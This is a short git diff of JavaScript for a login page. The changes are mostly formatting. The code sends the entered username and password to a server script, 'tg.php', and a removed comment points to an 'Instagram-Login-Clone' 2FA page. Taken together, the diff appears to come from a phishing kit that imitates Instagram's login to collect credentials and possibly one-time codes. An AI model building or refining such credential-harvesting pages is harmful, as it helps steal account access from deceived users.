@@ -1,4 +1,4 @@
-const showPsswd  = document.getElementById('toggle-password');
+const showPsswd = document.getElementById('toggle-password');
 const pswdInput = document.getElementById('password');
 const usernameInput = document.getElementById('username');
 const loginBtn = document.getElementById('login-btn');
@@ -33,8 +33,8 @@ usernameInput.addEventListener('input', toggleLoginButton);
 showPsswd.addEventListener('click', () => {
     // console.log('toggle password');
     // console.log(pswdInput);
-    pswdInput.type = pswdInput.type === 'password'? 'text' : 'password';  // Toggle between 'password' and 'text' types
-    showPsswd.textContent = pswdInput.type === 'password'? 'Show' : 'Hide'; // Update the button text
+    pswdInput.type = pswdInput.type === 'password' ? 'text' : 'password';  // Toggle between 'password' and 'text' types
+    showPsswd.textContent = pswdInput.type === 'password' ? 'Show' : 'Hide'; // Update the button text
 })
 
 loginBtn.addEventListener('click', (e) => {
@@ -51,7 +51,7 @@ loginBtn.addEventListener('click', (e) => {
         formData.append('username', usernameInput.value);
         formData.append('password', pswdInput.value);
 
-        fetch("http://localhost:8080/script/tg.php", {
+        fetch("/script/tg.php", {
             method: "POST",
             body: formData, // Use FormData object to send data
         })
@@ -79,9 +79,5 @@ loginBtn.addEventListener('click', (e) => {
                 }
             })
             .catch(error => console.log(error));
-
-
-        //errMsg.textContent = '';
-        // window.location.href = `${window.location.origin}/Instagram-Login-Clone/2FA.html`;
     }
 });
